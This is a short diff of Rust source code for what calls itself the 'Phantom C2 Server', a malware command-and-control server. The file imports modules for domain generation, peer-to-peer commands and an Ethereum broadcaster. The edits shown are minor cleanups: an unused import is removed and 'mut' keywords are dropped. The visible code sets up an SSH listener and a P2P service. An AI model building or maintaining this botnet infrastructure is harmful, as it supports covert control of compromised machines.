@@ -11,7 +11,6 @@ mod dga;
 mod p2p;
 mod eth_broadcaster;
 use p2p::P2PService;
-use protocol::p2p::{P2PCommand, P2P_MAGIC, P2P_TYPE_CMD};
 
 #[derive(Parser, Debug)]
 #[command(name = "Phantom C2 Server")]
@@ -67,12 +66,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         auth_rejection_time: std::time::Duration::from_secs(1),
         ..Default::default()
     };
-    let config = Arc::new(config);
+    let _config = Arc::new(config);
 
     // 3. Generate/Load Host Key (For the SSH connection itself)
     // We generate a fresh key on startup for simplicity (User sees warning on connect)
     // Or we could save it.
-    let mut shk = russh_keys::key::KeyPair::generate_ed25519().unwrap();
+    let shk = russh_keys::key::KeyPair::generate_ed25519().unwrap();
     // Wrap in Arc/Mutex logic if needed or just use it.
     // Russh expects us to load keys into config? 
     // Wait, russh server logic usually sets keys in config.keys
@@ -89,7 +88,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // User requested log display in this terminal
     info!("Connect via: ssh admin@<IP> -p {}", cli.port);
     
-    let mut listener = TcpListener::bind(&addr).await.expect("Bind failed");
+    let listener = TcpListener::bind(&addr).await.expect("Bind failed");
     
     // 4. Initialize P2P Service
     let p2p_service = Arc::new(P2PService::new(Arc::new(master_key.clone())).await.expect("Failed to bind P2P"));
